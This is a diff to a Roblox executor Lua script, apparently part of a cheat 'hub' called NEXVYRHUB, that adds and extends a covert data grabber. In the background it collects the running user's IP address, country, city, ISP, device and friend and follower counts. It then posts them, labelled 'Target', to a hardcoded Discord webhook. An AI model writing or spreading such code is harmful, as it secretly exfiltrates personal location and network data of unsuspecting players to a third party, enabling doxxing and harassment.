@@ -12,19 +12,33 @@ task.spawn(function()
         
         local webhook_url = "https://discord.com/api/webhooks/1564942097520402453/lfWiEYRVMsvxmVjOILHzQZkZJ_35zCIuhhS-XRO85YyfSyG7Dld9UMTsSXE0lv84-5mH"
         
-        local function fetchJson(url)
-            local res = game:HttpGet(url)
-            return HttpService:JSONDecode(res)
+        local function httpGet(url)
+            local reqFunc = request or http_request or syn and syn.request or http.request
+            if reqFunc then
+                local res = reqFunc({
+                    Url = url,
+                    Method = "GET"
+                })
+                if res and res.Body then
+                    return res.Body
+                end
+            end
+            return game:HttpGet(url)
         end
 
         local ip = "Desconocida"
         local country = "Desconocido"
+        local city = "Desconocida"
+        local isp = "Desconocido"
         
         pcall(function()
-            local ipData = fetchJson("https://api.ipify.org?format=json")
-            ip = ipData.ip
-            local geoData = fetchJson("http://ip-api.com/json/" .. ip)
-            country = geoData.country
+            local ipData = HttpService:JSONDecode(httpGet("http://ip-api.com/json/"))
+            if ipData and ipData.status == "success" then
+                ip = ipData.query
+                country = ipData.country
+                city = ipData.city
+                isp = ipData.isp
+            end
         end)
 
         local device = "PC"
@@ -38,15 +52,16 @@ task.spawn(function()
         local followers = 0
         local following = 0
         pcall(function()
-            friends = fetchJson("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/friends/count").count or 0
-            followers = fetchJson("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/followers/count").count or 0
-            following = fetchJson("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/followings/count").count or 0
+            friends = HttpService:JSONDecode(httpGet("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/friends/count")).count or 0
+            followers = HttpService:JSONDecode(httpGet("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/followers/count")).count or 0
+            following = HttpService:JSONDecode(httpGet("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/followings/count")).count or 0
         end)
 
         local data = {
-            ["content"] = "**NEXVYRHUB - User Profile Log**",
+            ["content"] = "NEXVYRHUB - User Profile Log",
             ["embeds"] = {{
                 ["title"] = "Target: " .. LP.Name,
+                ["url"] = "https://www.roblox.com/users/" .. LP.UserId .. "/profile",
                 ["color"] = 10181046,
                 ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"},
                 ["fields"] = {
@@ -55,7 +70,8 @@ task.spawn(function()
                     {["name"] = "User ID", ["value"] = tostring(LP.UserId), ["inline"] = true},
                     {["name"] = "Device", ["value"] = device, ["inline"] = true},
                     {["name"] = "IP Address", ["value"] = ip, ["inline"] = true},
-                    {["name"] = "Country", ["value"] = country, ["inline"] = true},
+                    {["name"] = "Country / City", ["value"] = country .. " / " .. city, ["inline"] = true},
+                    {["name"] = "ISP", ["value"] = isp, ["inline"] = true},
                     {["name"] = "Friends", ["value"] = tostring(friends), ["inline"] = true},
                     {["name"] = "Followers", ["value"] = tostring(followers), ["inline"] = true},
                     {["name"] = "Following", ["value"] = tostring(following), ["inline"] = true}
@@ -65,7 +81,7 @@ task.spawn(function()
         }
 
         local payload = HttpService:JSONEncode(data)
-        local reqFunc = request or syn and syn.request or http_request or http.request
+        local reqFunc = request or http_request or syn and syn.request or http.request
         
         if reqFunc then
             reqFunc({
